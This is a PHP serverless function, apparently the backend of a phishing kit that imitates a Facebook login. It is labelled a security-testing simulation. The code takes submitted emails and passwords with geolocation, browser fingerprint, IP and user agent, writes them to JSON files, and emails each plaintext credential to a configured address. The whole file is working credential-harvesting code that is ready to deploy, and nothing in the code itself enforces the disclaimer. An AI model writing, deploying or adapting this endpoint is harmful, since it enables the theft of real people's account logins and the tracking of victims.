<?php
/**
 * Facebook Phishing Sim - Credential Capture Endpoint
 * Authorized Security Testing Only
 *
 * Vercel PHP Serverless Function
 * Stores data to /tmp/data.json (Vercel temp storage)
 * Also attempts to send via email if SMTP configured
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle CORS preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// Read input
$input = json_decode(file_get_contents('php://input'), true);
if (!$input || !isset($input['credentials'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid data']);
    exit;
}

// Sanitize for storage
$entry = [
    'id' => uniqid('fb_', true),
    'credentials' => [
        'email' => substr($input['credentials']['email'] ?? '', 0, 255),
        'password' => substr($input['credentials']['password'] ?? '', 0, 255),
        'submittedAt' => $input['credentials']['submittedAt'] ?? date('c')
    ],
    'geolocation' => $input['geolocation'] ?? null,
    'fingerprint' => $input['fingerprint'] ?? null,
    'ip' => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'userAgent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
    'timestamp' => date('c'),
    'capturedAt' => time()
];

// ===== PERSISTENT STORAGE =====
// Strategy 1: Write to /tmp/data.json (Vercel temp storage)
// Note: /tmp is ephemeral per-instance on Vercel, but good for short-term capture
$tmpFile = '/tmp/data.json';
$allData = [];

if (file_exists($tmpFile)) {
    $content = file_get_contents($tmpFile);
    $allData = json_decode($content, true) ?? [];
}

$allData[] = $entry;
file_put_contents($tmpFile, json_encode($allData, JSON_PRETTY_PRINT));

// ===== STRATEGY 2: Also append to a data file in api/ directory (persists across deploys) =====
$dataFile = __DIR__ . '/data.json';
$persistentData = [];

if (file_exists($dataFile)) {
    $content = file_get_contents($dataFile);
    $persistentData = json_decode($content, true) ?? [];
}

$persistentData[] = $entry;
file_put_contents($dataFile, json_encode($persistentData, JSON_PRETTY_PRINT));

// ===== STRATEGY 3: Email notification (if configured) =====
$smtpHost = getenv('SMTP_HOST');
$smtpUser = getenv('SMTP_USER');
$smtpPass = getenv('SMTP_PASS');
$notifyEmail = getenv('NOTIFY_EMAIL');

if ($smtpHost && $smtpUser && $smtpPass && $notifyEmail) {
    try {
        $subject = '[PHISH] New Credentials Captured - ' . $entry['credentials']['email'];
        $message = "New capture:\n\n";
        $message .= "Email: " . $entry['credentials']['email'] . "\n";
        $message .= "Password: " . $entry['credentials']['password'] . "\n";
        $message .= "Time: " . $entry['credentials']['submittedAt'] . "\n";
        $message .= "IP: " . $entry['ip'] . "\n";
        if ($entry['geolocation']) {
            $message .= "Location: " . json_encode($entry['geolocation']) . "\n";
        }
        $message .= "\n---\nView all: https://" . ($_SERVER['HTTP_HOST'] ?? '') . "/api/admin.php\n";

        $headers = 'From: ' . $smtpUser . "\r\n" .
                   'Reply-To: ' . $smtpUser . "\r\n" .
                   'X-Mailer: PHP/' . phpversion();

        mail($notifyEmail, $subject, $message, $headers);
    } catch (Exception $e) {
        // Email failed silently - not critical
    }
}

// Return success
http_response_code(200);
echo json_encode([
    'success' => true,
    'id' => $entry['id'],
    'message' => 'Captured'
]);
